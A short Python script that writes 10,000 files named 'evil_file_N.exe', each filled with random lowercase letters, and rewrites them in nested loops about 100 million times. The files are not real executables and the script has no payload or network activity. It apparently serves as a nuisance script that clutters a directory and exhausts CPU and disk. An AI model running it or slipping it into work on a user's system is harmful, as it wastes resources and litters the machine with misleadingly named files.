import random
import string

for i in range(10000):
	for i in range(10000):
		with open(f"evil_file_{i}.exe", "w") as outfile:
			b = ""
			for i in range(10000):
				b += random.choice(string.ascii_lowercase)
			outfile.write(b)
